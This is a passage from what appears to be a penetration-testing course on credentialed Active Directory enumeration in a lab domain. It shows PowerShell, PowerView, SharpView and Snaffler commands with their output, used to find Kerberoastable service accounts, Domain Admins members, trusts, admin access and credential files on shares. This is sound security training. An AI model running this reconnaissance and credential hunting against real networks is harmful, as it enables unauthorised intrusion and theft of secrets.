Get-Module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...\n```\n\nWe'll see that the ActiveDirectory module is not yet imported. Let's go ahead and import it.\n\n#### Load ActiveDirectory Module\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Import-Module ActiveDirectory\nPS C:\\htb> Get-Module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nManifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  \n```\n\nNow that our modules are loaded, let's begin. First up, we'll enumerate some basic information about the domain with the [Get-ADDomain](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps) cmdlet.\n\n### Get Domain Info\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADDomain\n\nAllowedDNSSuffixes                 : {}\nChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}\nComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL\nDeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL\nDistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL\nDNSRoot                            : INLANEFREIGHT.LOCAL\nDomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL\nDomainMode                         : Windows2016Domain\nDomainSID                          : S-1-5-21-3842939050-3880317879-2865463114\nForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL\nForest                             : INLANEFREIGHT.LOCAL\nInfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nLastLogonReplicationInterval       :\nLinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,\n                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN\n                                     EFREIGHT,DC=LOCAL}\nLostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL\nManagedBy                          :\nName                               : INLANEFREIGHT\nNetBIOSName                        : INLANEFREIGHT\nObjectClass                        : domainDNS\nObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a\nParentDomain                       :\nPDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nPublicKeyRequiredPasswordRolling   : True\nQuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL\nReadOnlyReplicaDirectoryServers    : {}\nReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}\nRIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\nSubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,\n                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,\n                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,\n                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}\nSystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL\nUsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n```\n\nThis will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet. We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.\n\n#### Get-ADUser\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n\nDistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nEnabled              : True\nGivenName            : Sharepoint\nName                 : adfs\nObjectClass          : user\nObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95\nSamAccountName       : adfs\nServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}\nSID                  : S-1-5-21-3842939050-3880317879-2865463114-5244\nSurname              : Admin\nUserPrincipalName    :\n\nDistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nEnabled              : True\nGivenName            : Jessica\nName                 : BACKUPAGENT\nObjectClass          : user\nObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed\nSamAccountName       : backupagent\nServicePrincipalName : {backupjob/veam001.inlanefreight.local}\nSID                  : S-1-5-21-3842939050-3880317879-2865463114-5220\nSurname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9\nUserPrincipalName    :\n\n<SNIP>\n```\n\nAnother interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet\n\n#### Checking For Trust Relationships\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADTrust -Filter *\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nForestTransitive        : False\nIntraForest             : True\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LOGISTICS.INLANEFREIGHT.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=INLANEFREIGHT,DC=LOCAL\nTarget                  : LOGISTICS.INLANEFREIGHT.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 32\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nForestTransitive        : True\nIntraForest             : False\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : FREIGHTLOGISTICS.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=INLANEFREIGHT,DC=LOCAL\nTarget                  : FREIGHTLOGISTICS.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 8\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False  \n```\n\nThis cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. Next, we can gather AD group information using the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet.\n\n#### Group Enumeration\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADGroup -Filter * | select name\n\nname\n----\nAdministrators\nUsers\nGuests\nPrint Operators\nBackup Operators\nReplicator\nRemote Desktop Users\nNetwork Configuration Operators\nPerformance Monitor Users\nPerformance Log Users\nDistributed COM Users\nIIS_IUSRS\nCryptographic Operators\nEvent Log Readers\nCertificate Service DCOM Access\nRDS Remote Access Servers\nRDS Endpoint Servers\nRDS Management Servers\nHyper-V Administrators\nAccess Control Assistance Operators\nRemote Management Users\nStorage Replica Administrators\nDomain Computers\nDomain Controllers\nSchema Admins\nEnterprise Admins\nCert Publishers\nDomain Admins\n\n<SNIP>\n```\n\nWe can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:\n\n#### Detailed Group Info\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADGroup -Identity \"Backup Operators\"\n\nDistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL\nGroupCategory     : Security\nGroupScope        : DomainLocal\nName              : Backup Operators\nObjectClass       : group\nObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38\nSamAccountName    : Backup Operators\nSID               : S-1-5-32-551\n```\n\nNow that we know more about the group, let's get a member listing using the [Get-ADGroupMember](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps) cmdlet.\n\n### Group Membership\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-ADGroupMember -Identity \"Backup Operators\"\n\ndistinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nname              : BACKUPAGENT\nobjectClass       : user\nobjectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed\nSamAccountName    : backupagent\nSID               : S-1-5-21-3842939050-3880317879-2865463114-5220\n```\n\nWe can see that one account, `backupagent`, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.\n\nUtilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it. This way, our actions could potentially blend in more. Next, we will walk through the PowerView tool, which has many features to simplify enumeration and dig deeper into the domain.\n\n---\n\n## PowerView\n\n[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.\n\nLet's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.\n\n|**Command**|**Description**|\n|---|---|\n|`Export-PowerViewCSV`|Append results to a CSV file|\n|`ConvertTo-SID`|Convert a User or group name to its SID value|\n|`Get-DomainSPNTicket`|Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|\n|**Domain/LDAP Functions:**||\n|`Get-Domain`|Will return the AD object for the current (or specified) domain|\n|`Get-DomainController`|Return a list of the Domain Controllers for the specified domain|\n|`Get-DomainUser`|Will return all users or specific user objects in AD|\n|`Get-DomainComputer`|Will return all computers or specific computer objects in AD|\n|`Get-DomainGroup`|Will return all groups or specific group objects in AD|\n|`Get-DomainOU`|Search for all or specific OU objects in AD|\n|`Find-InterestingDomainAcl`|Finds object ACLs in the domain with modification rights set to non-built in objects|\n|`Get-DomainGroupMember`|Will return the members of a specific domain group|\n|`Get-DomainFileServer`|Returns a list of servers likely functioning as file servers|\n|`Get-DomainDFSShare`|Returns a list of all distributed file systems for the current (or specified) domain|\n|**GPO Functions:**||\n|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|\n|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|\n|**Computer Enumeration Functions:**||\n|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|\n|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|\n|`Get-NetShare`|Returns open shares on the local (or a remote) machine|\n|`Get-NetSession`|Will return session information for the local (or a remote) machine|\n|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|\n|**Threaded 'Meta'-Functions:**||\n|`Find-DomainUserLocation`|Finds machines where specific users are logged in|\n|`Find-DomainShare`|Finds reachable shares on domain machines|\n|`Find-InterestingDomainShareFile`|Searches for files matching specific criteria on readable shares in the domain|\n|`Find-LocalAdminAccess`|Find machines on the local domain where the current user has local administrator access|\n|**Domain Trust Functions:**||\n|`Get-DomainTrust`|Returns domain trusts for the current domain or a specified domain|\n|`Get-ForestTrust`|Returns all forest trusts for the current forest or a specified forest|\n|`Get-DomainForeignUser`|Enumerates users who are in groups outside of the user's domain|\n|`Get-DomainForeignGroupMember`|Enumerates groups with users outside of the group's domain and returns each foreign member|\n|`Get-DomainTrustMapping`|Will enumerate all trusts for the current domain and any others seen.|\n\nThis table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. For more on PowerView, check out the [Active Directory PowerView module](https://academy.hackthebox.com/course/preview/active-directory-powerview). Below we will experiment with a few of them.\n\nFirst up is the [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) function. This will provide us with information on all users or specific users we specify. Below we will use it to grab information about a specific user, `mmorgan`.\n\n#### Domain User Information\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n\nname                 : Matthew Morgan\nsamaccountname       : mmorgan\ndescription          :\nmemberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar\n                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security\n                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security\n                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}\nwhencreated          : 10/27/2021 5:37:06 PM\npwdlastset           : 11/18/2021 10:02:57 AM\nlastlogontimestamp   : 2/27/2022 6:34:25 PM\naccountexpires       : NEVER\nadmincount           : 1\nuserprincipalname    : mmorgan@inlanefreight.local\nserviceprincipalname :\nmail                 :\nuseraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH\n```\n\nWe saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/) function to retrieve group-specific information. Adding the `-Recurse` switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the `Secadmins` group is part of the `Domain Admins` group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.\n\n#### Recursive Group Membership\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb>  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n\nGroupDomain             : INLANEFREIGHT.LOCAL\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\nMemberDomain            : INLANEFREIGHT.LOCAL\nMemberName              : svc_qualys\nMemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613\n\nGroupDomain             : INLANEFREIGHT.LOCAL\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\nMemberDomain            : INLANEFREIGHT.LOCAL\nMemberName              : sp-admin\nMemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228\n\nGroupDomain             : INLANEFREIGHT.LOCAL\nGroupName               : Secadmins\nGroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nMemberDomain            : INLANEFREIGHT.LOCAL\nMemberName              : spong1990\nMemberDistinguishedName : CN=Maggie\n                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965\n\n<SNIP>  \n```\n\nAbove we performed a recursive look at the `Domain Admins` group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.\n\n#### Trust Enumeration\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainTrustMapping\n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : LOGISTICS.INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : FREIGHTLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n\nSourceName      : LOGISTICS.INLANEFREIGHT.LOCAL\nTargetName      : INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM \n```\n\nWe can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.\n\n#### Testing for Local Admin Access\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n\nComputerName    IsAdmin\n------------    -------\nACADEMY-EA-MS01    True \n```\n\nAbove, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.\n\n#### Finding Users With SPN Set\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n\nserviceprincipalname                          samaccountname\n--------------------                          --------------\nadfsconnect/azure01.inlanefreight.local       adfs\nbackupjob/veam001.inlanefreight.local         backupagent\nd0wngrade/kerberoast.inlanefreight.local      d0wngrade\nkadmin/changepw                               krbtgt\nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev\nMSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod\nMSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa\nsts/inlanefreight.local                       solarwindsmonitor\ntestspn/kerberoast.inlanefreight.local        testspn\ntestspn2/kerberoast.inlanefreight.local       testspn2\n```\n\nTest out some more of the tool's functions until you are comfortable using it. We will see PowerView quite a few more times as we progress through this module.\n\n---\n\n## SharpView\n\nPowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.\n\nAnother tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with `-Help` to get an argument list.\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> .\\SharpView.exe Get-DomainUser -Help\n\nGet_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum> \n```\n\nHere we can use SharpView to enumerate information about a specific user, such as the user `forend`, which we control.\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> .\\SharpView.exe Get-DomainUser -Identity forend\n\n[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL\n[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))\nobjectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}\nsamaccounttype                 : USER_OBJECT\nobjectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b\nuseraccountcontrol             : NORMAL_ACCOUNT\naccountexpires                 : 12/31/1600 4:00:00 PM\nlastlogon                      : 4/18/2022 1:01:21 PM\nlastlogontimestamp             : 4/9/2022 1:33:21 PM\npwdlastset                     : 2/28/2022 12:03:45 PM\nlastlogoff                     : 12/31/1600 4:00:00 PM\nbadPasswordTime                : 4/5/2022 7:09:07 AM\nname                           : forend\ndistinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nwhencreated                    : 2/28/2022 8:03:45 PM\nwhenchanged                    : 4/9/2022 8:33:21 PM\nsamaccountname                 : forend\nmemberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}\ncn                             : {forend}\nobjectclass                    : {top, person, organizationalPerson, user}\nbadpwdcount                    : 0\ncountrycode                    : 0\nusnchanged                     : 3259288\nlogoncount                     : 26618\nprimarygroupid                 : 513\nobjectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL\ndscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}\nusncreated                     : 3054181\ninstancetype                   : 4\ncodepage                       : 0\n```\n\nExperiment with SharpView on the MS01 host and recreate as many PowerView examples as possible. Though evasion is not in scope for this module, SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.\n\n---\n\n## Shares\n\nShares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with `pass` in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool `Snaffler` and see how it can aid us in identifying these issues more accurately and efficiently.\n\n---\n\n## Snaffler\n\n[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.\n\nTo execute Snaffler, we can use the command below:\n\n#### Snaffler Execution\n\nCode: bash\n\n```bash\nSnaffler.exe -s -d inlanefreight.local -o snaffler.log -v data\n```\n\nThe `-s` tells it to print results to the console for us, the `-d` specifies the domain to search within, and the `-o` tells Snaffler to write results to a logfile. The `-v` option is the verbosity level. Typically `data` is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.\n\n#### Snaffler in Action\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data\n\n .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..\n;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;\n'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['\n  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$\"\"   $$$$$$c\n 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,\n  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'\n                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler\n\n2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\ADMIN$)\n2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\C$)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\\address)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\User Shares)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\ZZZ_archive)\n2022-03-31 12:17:18 -07:00 [Share] {Green}(\\\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\\CertEnroll)\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.kdb$|289B|3/31/2022 12:09:22 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\GroupBackup.kdb) .kdb\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.key$|299B|3/31/2022 12:05:33 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ShowReset.key) .key\n2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\UpdateServicesPackages)\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WriteUse.kwallet) .kwallet\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.key$|298B|3/31/2022 12:05:10 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ProtectStep.key) .key\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.ppk$|275B|3/31/2022 12:04:40 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\StopTrace.ppk) .ppk\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.key$|301B|3/31/2022 12:09:17 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WaitClear.key) .key\n2022-03-31 12:17:19 -07:00 